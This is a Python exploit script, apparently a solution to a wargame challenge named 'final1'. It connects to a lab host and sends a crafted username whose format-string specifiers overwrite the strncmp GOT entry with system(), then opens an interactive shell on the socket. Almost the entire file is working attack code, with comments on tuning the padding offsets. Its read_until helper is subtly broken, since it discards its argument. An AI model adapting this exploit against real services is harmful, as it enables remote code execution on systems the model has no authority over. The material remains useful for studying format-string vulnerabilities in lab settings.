import struct
import socket
import telnetlib
encode_e = 'ascii'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.6", 2994))
def read_until(check):
    buffer = b''
    check = b''
    while check not in buffer:
        buffer += s.recv(1)    #read 1 character
    return buffer


STRNCMP = struct.pack("I",0x804a1a8) #for 2nd padding 0x0000XXXX
STRNCMP2 = struct.pack("I",0x804a1a8 + 2) #for 1st padding 0xXXXX0000
#overwrite location with system() 0xb7ecffb0 0xb7ecffb0
#Login from 10.10.10.4:44046 as [password] with password [password]
ip,port =s.getsockname()
hostname = ip+":"+str(port)
pad = ("A"*(24-len(hostname))).encode(encode_e)
username = pad+ "BBBB".encode(encode_e)+ STRNCMP + STRNCMP2 + ("%17$65403x %18$08n   %18$47158x   %19$08n").encode(encode_e) #initially STRNCMP+'%17$08x %18$08n'-->for 0x0000XXXX
#                                             17th value               extrabytes to match address 
#and iterate accordingly until it gets matched. AFTER that for 0xXXXX0000 (STRNCMP + STRNCMP2 +"%17$65403x %18$08n   %18$32x   %19$08n) do iteration as above

login = 'CCCC'.encode(encode_e)
print(read_until("[final1] $ "))
#input ("Waiting ..... hit any key") Used inly during reversing process
s.send('username '.encode(encode_e)+ username+"\n".encode(encode_e))
print(read_until("[final1] $ "))
s.send('login '.encode(encode_e)+login+"\n".encode(encode_e))
print(read_until("[final1] $ "))
#input ("Waiting ..... hit any key")
t = telnetlib.Telnet()
t.sock = s
t.interact()